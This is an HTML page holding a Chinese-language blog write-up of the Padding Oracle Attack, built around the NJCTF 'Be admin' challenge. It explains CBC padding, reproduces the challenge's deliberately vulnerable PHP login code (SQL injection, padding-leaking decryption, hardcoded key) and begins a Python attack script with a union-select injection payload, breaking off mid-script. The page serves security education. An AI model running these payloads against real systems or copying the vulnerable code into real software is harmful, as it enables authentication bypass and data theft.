@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="WEB漏洞," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="4ct10n's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Padding Oracle Attack是一个经典的攻击，在《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式,本篇文章结合着NJCTF的Be admin 进行详细的讲解，扫除知识上的盲点。   本篇文章讲解的顺序是攻击原理、攻击条件、本地测试、结果分析与总结四个方面进行详细的讲解。">
+<meta name="keywords" content="WEB漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Padding Oracle Attack 分析">
+<meta property="og:url" content="http://yoursite.com/2017/05/12/Padding Oracle Attack 分析/index.html">
+<meta property="og:site_name" content="4ct10n&#39;s Blog">
+<meta property="og:description" content="Padding Oracle Attack是一个经典的攻击，在《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式,本篇文章结合着NJCTF的Be admin 进行详细的讲解，扫除知识上的盲点。   本篇文章讲解的顺序是攻击原理、攻击条件、本地测试、结果分析与总结四个方面进行详细的讲解。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.blog.csdn.net/20170512210713313?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170512210742593?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170512211049286?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170620232727919?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170512214813005?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170512214735088?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:updated_time" content="2017-10-22T02:14:30.923Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Padding Oracle Attack 分析">
+<meta name="twitter:description" content="Padding Oracle Attack是一个经典的攻击，在《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式,本篇文章结合着NJCTF的Be admin 进行详细的讲解，扫除知识上的盲点。   本篇文章讲解的顺序是攻击原理、攻击条件、本地测试、结果分析与总结四个方面进行详细的讲解。">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20170512210713313?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/05/12/Padding Oracle Attack 分析/"/>
+
+
+
+
+
+  <title>Padding Oracle Attack 分析 | 4ct10n's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">4ct10n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/12/Padding Oracle Attack 分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="4ct10n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/qq.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="4ct10n's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Padding Oracle Attack 分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-12T21:51:00+08:00">
+                2017-05-12
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-10-22T10:14:30+08:00">
+                2017-10-22
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Padding Oracle Attack是一个经典的攻击，在《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式,本篇文章结合着NJCTF的Be admin 进行详细的讲解，扫除知识上的盲点。   本篇文章讲解的顺序是攻击原理、攻击条件、本地测试、结果分析与总结四个方面进行详细的讲解。<br><a id="more"></a></p>
+<p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p>
+<div class="markdown_views"><blockquote><br><p>Padding Oracle Attack是一个经典的攻击，在《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式,本篇文章结合着NJCTF的Be admin 进行详细的讲解，扫除知识上的盲点。 <br><br>  本篇文章讲解的顺序是攻击原理、攻击条件、本地测试、结果分析与总结四个方面进行详细的讲解。<br></p><br></blockquote><br><p><div class="toc"><div class="toc"><br><ul><br><li><a href="#0x00攻击原理">0x00攻击原理</a><ul><br><li><a href="#0x1-padding">0x1 padding</a></li><br><li><a href="#0x2-cbc分组密码的链接模式">0x2 CBC分组密码的链接模式</a></li><br><li><a href="#0x3-原理总结">0x3 原理总结</a></li><br></ul><br></li><br><li><a href="#0x01-攻击条件">0x01 攻击条件</a></li><br><li><a href="#0x02-本地测试">0x02 本地测试</a><ul><br><li><a href="#0x1-在本地服务器测试代码">0x1 在本地服务器测试代码</a></li><br><li><a href="#0x2-攻击代码">0x2 攻击代码</a></li><br><li><a href="#0x3-单个检验二值的代码">0x3 单个检验二值的代码</a></li><br><li><a href="#0x4-使用cbc字节翻转">0x4 使用CBC字节翻转</a></li><br><li><a href="#0x5-任意值解密">0x5 任意值解密</a></li><br></ul><br></li><br><li><a href="#0x03-结果分析">0x03 结果分析</a></li><br></ul><br></div><br></div><br></p><br><h1 id="0x00攻击原理">0x00攻击原理</h1><br><h2 id="0x1-padding">0x1 padding</h2><br><blockquote><br><p>由于CBC是块密码工作模式, 所以要求明文长度必须是块长度的整数倍. <br><br>  对于不满足的数据, 会进行数据填充到满足整数倍. 即 padding<br></p><br></blockquote><br><pre class="prettyprint"><code class=" hljs markdown"><span class="hljs-strong"><strong> </strong></span> <span class="hljs-strong"><strong> </strong></span> <span class="hljs-strong"><strong> </strong></span> <strong> 01<br><span class="hljs-strong"></span></strong> <strong> <span class="hljs-strong"></span></strong> <strong> <span class="hljs-strong"></span></strong> <strong> 02 02<br><span class="hljs-strong"></span></strong> <strong> <span class="hljs-strong"></span></strong> <strong> </strong> 03 03 03<br><span class="hljs-strong"><strong> </strong></span> <span class="hljs-strong"><strong> </strong></span> 04 04 04 04<br><span class="hljs-strong"><strong> </strong></span> <strong> 05 05 05 05 05<br><span class="hljs-strong"></span></strong> <strong> 06 06 06 06 06 06
+</strong> 07 07 07 07 07 07 07<br>08 08 08 08 08 08 08 08</code></pre><br><p>即空N位就用N个\xN 进行补全 <br><br>对于刚好满足明文, 则需要另补出一个块长度的数据<br></p><br><h2 id="0x2-cbc分组密码的链接模式">0x2 CBC分组密码的链接模式</h2><br><blockquote><br><p>由于此处的Padding Oracle Attack是针对CBC分组密码的链接模式来讲的因此此处再讲讲CBC</p><br></blockquote><br><p></p><center> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170512210713313?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>CBC模式加密流程图 <br><br><center> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170512210742593?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>CBC模式解密流程图<br><br></center><br><br><br></center><p></p><br><p>理解以上两张图以后还需要知道以下这张图中的intermediary Value的意思，意为中间值（其实就是解密操作后的值） <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170512211049286?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><blockquote><br><p>明文、密文、IV、恶意明文、恶意IV 关系 <br><br>  明文 = 解密(密文) XOR IV <br><br>  特殊的明文 = 解密(密文) XOR 特殊IV<br><br></p><br></blockquote><br><h2 id="0x3-原理总结">0x3 原理总结</h2><br><pre><code>1. 基于密码学算法的攻击，往往第一个要搞清楚的是，我们在攻击谁，或者准确的说我们的攻击点在哪里？在一个密码学算法中，有很多的参数(指攻击者可以控制的参数)，攻击者往往是针对其中某一个或某一些参数进行破解，穷举等攻击。<br><br><br>在Padding Oracle Attack攻击中，攻击者输入的参数是IV+Cipher，我们要通过对IV的”穷举”来请求服务器端对我们指定的Cipher进行解密，并对返回的结果进行判断。<br><br><br>2. 和SQL注入中的Blind Inject思想类似。我觉得Padding Oracle Attack也是利用了这个二值逻辑的推理原理，或者说这是一种”边信道攻击(Side channel attack)”。<a href="http://en.wikipedia.org/wiki/Side_channel_attack" target="_blank" rel="external">http://en.wikipedia.org/wiki/Side_channel_attack</a><br><br><br>这种漏洞不能算是密码学算法本身的漏洞，但是当这种算法在实际生产环境中使用不当就会造成问题。<br><br><br>和盲注一样，这种二值逻辑的推理关键是要找到一个”区分点”，即能被攻击者用来区分这个的输入是否达到了目的(在这里就是寻找正确的IV)。<br><br><br>比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。<br></code></pre><br><h1 id="0x01-攻击条件">0x01 攻击条件</h1><br><pre><code>1.可以控制密文 或者 IV<br>2.如果解密后不满足 padding 服务端会报错.<br></code></pre><br><p>一般我们在攻击时，可以控制IV或密文的其中之一（一般是控制IV），这样我们可以通过盲注的方法把中间值注出来。 <br><br>第二个条件，如果padding的结果不对就会返回False，如果正确就会返回解密的值<br></p><br><p>所以说攻击过程程就相当于盲注过程 <br><br>下面会本地复现<code>Be admin</code><br></p><br><h1 id="0x02-本地测试">0x02 本地测试</h1><br><blockquote><br><p>这里直接使用NJCTF的代码</p><br></blockquote><br><p><strong>注意数据库的搭建！！！</strong></p><br><h2 id="0x1-在本地服务器测试代码">0x1 在本地服务器测试代码</h2><br><pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>define(<span class="hljs-string">“SECRET_KEY”</span>, <span class="hljs-string">“1234567812345678”</span>);<br>define(<span class="hljs-string">“METHOD”</span>, <span class="hljs-string">“aes-128-cbc”</span>);<br><br>session_start();<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_random_token</span><span class="hljs-params">()</span>{</span><br>    <span class="hljs-variable">$random_token</span>=<span class="hljs-string">‘’</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>;<span class="hljs-variable">$i</span>++){<br>        <span class="hljs-variable">$random_token</span>.=chr(rand(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>));<br>    }<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$random_token</span>;<br>}<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_identity</span><span class="hljs-params">()</span><br>{</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$defaultId</span>;<br>    <span class="hljs-variable">$defaultId</span>=<span class="hljs-string">‘action’</span>;<br>    <span class="hljs-variable">$j</span> = <span class="hljs-variable">$defaultId</span>;<br>    <span class="hljs-variable">$token</span> = get_random_token();<br>    <span class="hljs-variable">$c</span> = openssl_encrypt(<span class="hljs-variable">$j</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$token</span> );<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘id’</span>] = base64_encode(<span class="hljs-variable">$c</span>);<br>    setcookie(<span class="hljs-string">“ID”</span>, base64_encode(<span class="hljs-variable">$c</span>));<br>    setcookie(<span class="hljs-string">“token”</span>, base64_encode(<span class="hljs-variable">$token</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$j</span> === <span class="hljs-string">‘admin’</span>) {<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘isadmin’</span>] = <span class="hljs-keyword">true</span>;<br>    } <span class="hljs-keyword">else</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘isadmin’</span>] = <span class="hljs-keyword">false</span>;<br><br>}<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_identity</span><span class="hljs-params">()</span><br>{</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“token”</span>]))<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘id’</span>])) {<br>        <span class="hljs-variable">$c</span> = base64_decode(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘id’</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> = openssl_decrypt(<span class="hljs-variable">$c</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“token”</span>]))) {<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">‘admin’</span>) {<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘isadmin’</span>] = <span class="hljs-keyword">true</span>;<br>            } <span class="hljs-keyword">else</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘isadmin’</span>] = <span class="hljs-keyword">false</span>;<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">“ERROR!”</span>);<br>        }<br>    }<br>}<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-variable">$pass</span>)</span>//这里是攻击的地方<br>{</span><br>    <span class="hljs-variable">$encrypted_pass</span> = base64_decode(<span class="hljs-variable">$encrypted_pass</span>);<br>    <span class="hljs-variable">$iv</span> = substr(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$cipher</span> = substr(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$password</span> = openssl_decrypt(<span class="hljs-variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);<br>    <span class="hljs-keyword">echo</span>  var_dump(<span class="hljs-variable">$password</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$password</span> == <span class="hljs-variable">$pass</span>;<br>}<br><span class="hljs-comment">#0000000000000000</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">need_login</span><span class="hljs-params">(<span class="hljs-variable">$message</span> = NULL)</span> {</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">“   &lt;!doctype html&gt;<br>        &lt;html&gt;<br>        &lt;head&gt;<br>        &lt;meta charset=\”UTF-8\”&gt;<br>        &lt;title&gt;Login&lt;/title&gt;<br>        &lt;link rel=\”stylesheet\” href=\”CSS/target.css\”&gt;<br>            &lt;script src=\”<a href="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\&quot;&gt;&lt;/script&amp;gt" target="_blank" rel="external">https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\&quot;&gt;&lt;/script&amp;gt</a>;<br>        &lt;/head&gt;<br>        &lt;body&gt;”</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$message</span>)) {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">“  &lt;div&gt;”</span> . <span class="hljs-variable">$message</span> . <span class="hljs-string">“&lt;/div&gt;\n”</span>;<br>    }<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">“&lt;form method=\”POST\” action=’’&gt;<br>            &lt;div class=\”body\”&gt;&lt;/div&gt;<br>                &lt;div class=\”grad\”&gt;&lt;/div&gt;<br>                    &lt;div class=\”header\”&gt;<br>                        &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;<br>                    &lt;/div&gt;<br>                    &lt;br&gt;<br>                    &lt;div class=\”login\”&gt;<br>                        &lt;input type=\”text\” placeholder=\”username\” name=\”username\”&gt;<br>                        &lt;input type=\”password\” placeholder=\”password\” name=\”password\”&gt;<br>                        &lt;input type=\”submit\” value=\”Login\”&gt;<br>                    &lt;/div&gt;<br>                     &lt;script src=’<a href="http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&#39;&gt;&lt;/script&amp;gt" target="_blank" rel="external">http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&#39;&gt;&lt;/script&amp;gt</a>;<br>            &lt;/form&gt;<br>        &lt;/body&gt;<br>    &lt;/html&gt;”</span>;<br>}<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">“flag{here_is_it}”</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_homepage</span><span class="hljs-params">()</span> {</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">“&lt;!doctype html&gt;<br>&lt;html&gt;<br>&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;<br>&lt;body&gt;”</span>;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br><br>    printf(<span class="hljs-string">“Hello ~~~ ctfer! “</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">“isadmin”</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">“&lt;div&gt;&lt;a href=\”logout.php\”&gt;Log out&lt;/a&gt;&lt;/div&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;”</span>;<br><br>}<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘username’</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘password’</span>])) {<br>    <span class="hljs-variable">$username</span> = (string)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘username’</span>];<br>    <span class="hljs-variable">$password</span> = (string)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘password’</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">“localhost”</span>,<span class="hljs-string">“root”</span>,<span class="hljs-string">“”</span>,<span class="hljs-string">“test”</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">“有错误”</span>.mysql_error());<br><br><br>    <span class="hljs-variable">$query</span> = <span class="hljs-string">“SELECT username, encrypted_pass from users WHERE username=’$username’”</span>;<br><br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> trigger_error(<span class="hljs-variable">$conn</span>-&gt;error . <span class="hljs-string">“[$query]”</span>);<br><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$res</span>-&gt;fetch_assoc())<br>        <span class="hljs-variable">$encrypted_pass</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">“encrypted_pass”</span>];<br>        <span class="hljs-comment">// echo ‘P’.$encrypted_pass.’P’.var_dump($row) ;</span><br><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span> &amp;&amp; login(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-variable">$password</span>)) {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">“you are in!”</span> . <span class="hljs-string">“&lt;/br&gt;”</span>;<br>        get_identity();<br>        show_homepage();<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">“&lt;script&gt;alert(‘login failed!’);&lt;/script&gt;”</span>;<br>        need_login(<span class="hljs-string">“Login Failed!”</span>);<br>    }<br><br>} <span class="hljs-keyword">else</span> {<br>    test_identity();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">“id”</span>])) {<br>        show_homepage();<br>    } <span class="hljs-keyword">else</span> {<br>        need_login();<br>    }<br>}</span></code></pre><br><h2 id="0x2-攻击代码">0x2 攻击代码</h2><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># url=’<a href="http://218.2.197.235:23737/" target="_blank" rel="external">http://218.2.197.235:23737/</a>‘</span><br>url=<span class="hljs-string">‘<a href="http://127.0.0.1/2.php" target="_blank" rel="external">http://127.0.0.1/2.php</a>‘</span><br>N=<span class="hljs-number">16</span><br>phpsession=<span class="hljs-string">“”</span><br>ID=<span class="hljs-string">“”</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject1</span><span class="hljs-params">(password)</span>:</span><br>    param={<span class="hljs-string">‘username’</span>:<span class="hljs-string">“‘ union select ‘action’,’{password}”</span>.format(password=password),<span class="hljs-string">‘password’</span>:<span class="hljs-string">‘’</span>}<br>    result=requests.post(url,data=param)<br>    <span class="hljs-comment">#print result.content</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_token</span><span class="hljs-params">(token)</span>:</span><br>    header={<span class="hljs-string">“Cookie”</span>:<span class="hljs-string">“PHPSESSID=”</span>+phpsession+<span class="hljs-string">“;token=”</span>+token+<span class="hljs-string">“;ID=”</span>+ID}<br>    result=requests.post(url,headers=header)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span><span 